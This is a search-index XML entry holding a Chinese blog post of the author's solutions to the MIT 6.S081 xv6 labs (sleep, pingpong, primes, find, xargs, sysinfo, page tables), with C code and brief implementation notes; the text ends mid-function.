<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>6.S081_Fall2020_lab</title>
    <url>/2022/09/13/6-S081-Fall2020-lab/</url>
    <content><![CDATA[<!-- 试试看自己能坚持写完吗。 -->

<span id="more"></span>

<h1 id="Lab1-Xv6-and-Unix"><a href="#Lab1-Xv6-and-Unix" class="headerlink" title="Lab1: Xv6 and Unix"></a>Lab1: Xv6 and Unix</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">void</span>** argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bad argments.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> tmp=atoi(argv[<span class="number">1</span>]);</span><br><span class="line">		sleep(tmp*<span class="number">10</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> num 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> p1[<span class="number">2</span>],p2[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">int</span> pid;</span><br><span class="line">	</span><br><span class="line">	pipe(p1);</span><br><span class="line">	pipe(p2);</span><br><span class="line"></span><br><span class="line">	pid=fork();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fault in fork\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">		<span class="keyword">char</span> buf=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		pid=getpid();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(buf)&#123;</span><br><span class="line">				write(p1[<span class="number">1</span>],&amp;buf,<span class="number">1</span>);</span><br><span class="line">				buf=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">while</span>(!read(p2[<span class="number">0</span>],&amp;buf,<span class="number">2</span>));</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>,pid);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		close(p1[<span class="number">0</span>]);</span><br><span class="line">		close(p1[<span class="number">1</span>]);</span><br><span class="line">		close(p2[<span class="number">0</span>]);</span><br><span class="line">		close(p2[<span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">char</span> buf;</span><br><span class="line">		</span><br><span class="line">		pid=getpid();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(buf)&#123;</span><br><span class="line">				write(p2[<span class="number">1</span>],&amp;buf,<span class="number">1</span>);</span><br><span class="line">				buf=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">while</span>(!read(p1[<span class="number">0</span>],&amp;buf,<span class="number">2</span>));</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>,pid);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		close(p1[<span class="number">0</span>]);</span><br><span class="line">		close(p1[<span class="number">1</span>]);</span><br><span class="line">		close(p2[<span class="number">0</span>]);</span><br><span class="line">		close(p2[<span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">primes</span><span class="params">(<span class="keyword">int</span> *lp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> rp[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">int</span> pid;</span><br><span class="line">	<span class="keyword">int</span> prime,tmp;</span><br><span class="line"></span><br><span class="line">	close(lp[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(read(lp[<span class="number">0</span>],&amp;prime,<span class="keyword">sizeof</span>(<span class="keyword">int</span>))==<span class="keyword">sizeof</span>(<span class="keyword">int</span>))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>,prime);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(read(lp[<span class="number">0</span>],&amp;tmp,<span class="keyword">sizeof</span>(<span class="keyword">int</span>))==<span class="keyword">sizeof</span>(<span class="keyword">int</span>))&#123;</span><br><span class="line">			pipe(rp);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">do</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(tmp%prime)</span><br><span class="line">					write(rp[<span class="number">1</span>],&amp;tmp,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">			&#125;<span class="keyword">while</span>(read(lp[<span class="number">0</span>],&amp;tmp,<span class="keyword">sizeof</span>(<span class="keyword">int</span>))==<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">			pid=fork();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(pid&lt;<span class="number">0</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;failed in fork\n&quot;</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(!pid)&#123;</span><br><span class="line">				primes(rp);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				close(rp[<span class="number">1</span>]);</span><br><span class="line">				wait(<span class="number">0</span>);</span><br><span class="line">				close(rp[<span class="number">0</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">void</span>** argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">35</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//	if(argc!=2)&#123;</span></span><br><span class="line"><span class="comment">//		printf(&quot;bad argments.\n&quot;);</span></span><br><span class="line"><span class="comment">//		exit(-1);</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	else num=atoi(argv[1]);</span></span><br><span class="line"></span><br><span class="line">	pipe(p);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;num;i++)</span><br><span class="line">		write(p[<span class="number">1</span>],&amp;i,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">	primes(p);</span><br><span class="line">	close(p[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fmtname</span><span class="params">(<span class="keyword">char</span> *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> buf[DIRSIZ+<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">char</span> *p;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Find first character after last slash.</span></span><br><span class="line">	<span class="keyword">for</span>(p=path+<span class="built_in">strlen</span>(path); p &gt;= path &amp;&amp; *p != <span class="string">&#x27;/&#x27;</span>; p--)</span><br><span class="line">		;</span><br><span class="line">	p++;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Return blank-padded name.</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(p) &gt;= DIRSIZ)</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	memmove(buf, p, <span class="built_in">strlen</span>(p));</span><br><span class="line">	<span class="built_in">memset</span>(buf+<span class="built_in">strlen</span>(p), <span class="string">&#x27;\0&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> *path,<span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">512</span>], *p;</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>((fd = open(path, <span class="number">0</span>)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;find: cannot open %s\n&quot;</span>, path);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;find: cannot stat %s\n&quot;</span>, path);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>(st.type)&#123;</span><br><span class="line">	<span class="keyword">case</span> T_DEVICE:</span><br><span class="line">	<span class="keyword">case</span> T_FILE:</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(filename,fmtname(path)))</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,path);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> T_DIR:</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strlen</span>(path) + <span class="number">1</span> + DIRSIZ + <span class="number">1</span> &gt; <span class="keyword">sizeof</span> buf)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;find: path too long\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">strcpy</span>(buf, path);</span><br><span class="line">		p = buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">		*p++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="keyword">while</span>(read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de))&#123;</span><br><span class="line">			<span class="keyword">if</span>(de.inum == <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			memmove(p, de.name, DIRSIZ);</span><br><span class="line">			p[DIRSIZ] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span>(stat(buf, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;find: cannot stat %s\n&quot;</span>, buf);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(p,<span class="string">&quot;.&quot;</span>)||!<span class="built_in">strcmp</span>(p,<span class="string">&quot;..&quot;</span>))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			find(buf,filename);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">3</span>)</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;bad args\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		find(argv[<span class="number">1</span>],argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>** argv,<span class="keyword">int</span> bufnum,<span class="keyword">char</span> buf[][<span class="number">128</span>])</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;bufnum;i++)</span><br><span class="line">		argv[argc+i]=buf[i];</span><br><span class="line">	exec(argv[<span class="number">0</span>],argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xargs</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pid;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>][<span class="number">128</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> bufnum=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[i],<span class="string">&quot;-n&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>(*argv[i+<span class="number">1</span>]&lt;<span class="string">&#x27;9&#x27;</span> &amp;&amp; *argv[i+<span class="number">1</span>]&gt;<span class="string">&#x27;0&#x27;</span> &amp;&amp; !(<span class="built_in">strlen</span>(argv[i+<span class="number">1</span>])&gt;<span class="number">1</span>))</span><br><span class="line">			n=atoi(argv[++i]);</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;bad argments. n &lt;10 \n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">128</span>;j++)&#123;</span><br><span class="line">			len=read(<span class="number">0</span>,&amp;buf[i][j],<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span>(len&lt;=<span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(buf[i][j]==<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">				buf[i][j]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(len&lt;=<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		bufnum++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(n)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;n=%d\n&quot;</span>,n);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;bufnum&gt;<span class="number">0</span>;bufnum-=n,j++)&#123;</span><br><span class="line">			pid=fork();</span><br><span class="line">			<span class="keyword">if</span>(!pid)&#123;</span><br><span class="line">				<span class="keyword">if</span>(bufnum&gt;=n)</span><br><span class="line">					solve(argc-i,&amp;argv[i],n,&amp;buf[j*n]);</span><br><span class="line">				<span class="keyword">else</span> solve(argc-i,&amp;argv[i],bufnum,buf);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		solve(argc-i,&amp;argv[i],bufnum,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">void</span>** argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* args[MAXARG];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;bad argments.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(argc&gt;MAXARG)</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;too many argments.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;argc;i++)</span><br><span class="line">			args[i<span class="number">-1</span>]=argv[i];</span><br><span class="line"></span><br><span class="line">		xargs(i<span class="number">-1</span>,args);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Lab2-system-calls"><a href="#Lab2-system-calls" class="headerlink" title="Lab2: system calls"></a>Lab2: system calls</h1><h2 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h2><p>根据提示，一个系统调用需要：</p>
<ul>
<li>在user/user.h 中声明，系统调用的用户态原型</li>
<li>user/usys.S 中生成供调用跳转内核态执行对应系统调用的入口条目</li>
<li>kernel/syscall.h 中有系统调用对应的编号(系统调用号)</li>
<li>系统调用对应的程序代码在 kernel/sysproc.c</li>
</ul>
<p>除此之外，实现 tracing 的系统调用还需要：</p>
<ul>
<li>kernel/proc.h 中的 proc 结构体添加一个新变量，用来储存追踪中的系统调用号，而且根据实验描述，这个变量其实是个掩码。tracing 系统调用的主要任务就是获取这个新的变量。</li>
<li>这个变量是通过 argint() 获取的，因为 trap 机制会将寄存器的值先全部保存在 trapframe 中，可以通过 argXXX() 来读取寄存器里的数值。</li>
<li>最后的打印追踪目标则放在 syscall 中实现。</li>
</ul>
<h2 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retfreemem</span><span class="params">(struct sysinfo* addr)</span></span>&#123;                                           </span><br><span class="line">	<span class="comment">// 该处需要初始化freemem,否则会得到错误的数值</span></span><br><span class="line">  addr-&gt;freemem=<span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 看别人师傅的代码上了锁，确实应该，免得错误访问内存而程序终止了</span></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">for</span>(struct run *tmp=kmem.freelist;tmp;tmp=tmp-&gt;next)</span><br><span class="line">    addr-&gt;freemem+=PGSIZE;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retnproc</span><span class="params">(struct sysinfo* addr)</span></span>&#123;                      </span><br><span class="line">	<span class="comment">// 同样需要初始化</span></span><br><span class="line">  addr-&gt;nproc=<span class="number">0</span>;                                                      </span><br><span class="line">  <span class="keyword">for</span>(struct proc *p=proc;p&lt;&amp;proc[NPROC];p++)</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state!=UNUSED)</span><br><span class="line">      addr-&gt;nproc++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64 <span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">  argaddr(<span class="number">0</span>,&amp;addr);</span><br><span class="line">  retfreemem(&amp;info);</span><br><span class="line">  retnproc(&amp;info);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(copyout(myproc()-&gt;pagetable,addr,(<span class="keyword">char</span>*)&amp;info,<span class="keyword">sizeof</span>(struct sysinfo))&lt;<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;        </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Lab3-page-tables"><a href="#Lab3-page-tables" class="headerlink" title="Lab3: page tables"></a>Lab3: page tables</h1><h2 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h2><p>内核态与用户态，会共享一个只读页，方便用户直接访问，能够提升速度，也是这个实验要做的。</p>
<p>根据提示，在proc_pagetable中映射地址。但是并没有说具体映射的页pa，看了别人写的，是仿造trapframe的相关代码来写的，在allocproc中给usyscall也创建一个页。接着是寻找到允许用户读的权限，权限是保存在riscv.h中，能看到一个PTE_U，他的注释是<code>user can access</code>。最后在allocproc中将其实现和初始化。</p>
<p>最后还需要完善，将释放内存和页表映射放进去，继续模仿就行了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//struct proc</span></span><br><span class="line">……</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span>* <span class="title">usyscall</span>;</span>   <span class="comment">// user syscall</span></span><br><span class="line">……</span><br><span class="line"><span class="comment">//allocproc</span></span><br><span class="line">……</span><br><span class="line">    <span class="comment">// create ussycall page</span></span><br><span class="line">    <span class="keyword">if</span>((p-&gt;usyscall = (struct usyscall *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">      freeproc(p);</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;usyscall-&gt;pid=p-&gt;pid;</span><br><span class="line">……</span><br><span class="line"><span class="comment">//proc_pagetable</span></span><br><span class="line">……</span><br><span class="line">    <span class="comment">// map ropage</span></span><br><span class="line">    <span class="keyword">if</span>(mappages(pagetable, USYSCALL, PGSIZE,</span><br><span class="line">                (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      uvmfree(pagetable, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">……</span><br><span class="line"><span class="comment">//proc_pagetable</span></span><br><span class="line">……</span><br><span class="line">    uvmunmap(pagetable, USYSCALL, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">……</span><br><span class="line"><span class="comment">//freeproc</span></span><br><span class="line">……</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;usyscall)</span><br><span class="line">      kfree((<span class="keyword">void</span>*)p-&gt;usyscall);</span><br><span class="line">    p-&gt;usyscall=<span class="number">0</span>;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h2 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h2><p>跟着实验描述做，将第一个进程的页表打印出来，一看就觉得是树的遍历，再看输出格式应该是先序遍历。</p>
<p>因此vmprint应该使用递归来打印页表内容比较简单，又因为规定了需要写为vmprint仅有一个参数，所以在定义一个函数用来递归即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">traceleaf</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable,<span class="keyword">int</span> level)</span></span>&#123;                                           </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">pte_t</span> pte=pagetable[i];</span><br><span class="line">        <span class="keyword">if</span>(pte&amp;PTE_V)&#123;</span><br><span class="line">            uint64 child=PTE2PA(pte);</span><br><span class="line">            <span class="keyword">switch</span>(level)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;..%d: pte %p pa %p\n&quot;</span>,i,pte,child);</span><br><span class="line">                traceleaf((<span class="keyword">pagetable_t</span>)child,<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;.. ..%d: pte %p pa %p\n&quot;</span>,i,pte,child);</span><br><span class="line">                traceleaf((<span class="keyword">pagetable_t</span>)child,<span class="number">3</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;.. .. ..%d: pte %p pa %p\n&quot;</span>,i,pte,child);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vmprint</span><span class="params">(<span class="keyword">pagetable_t</span> 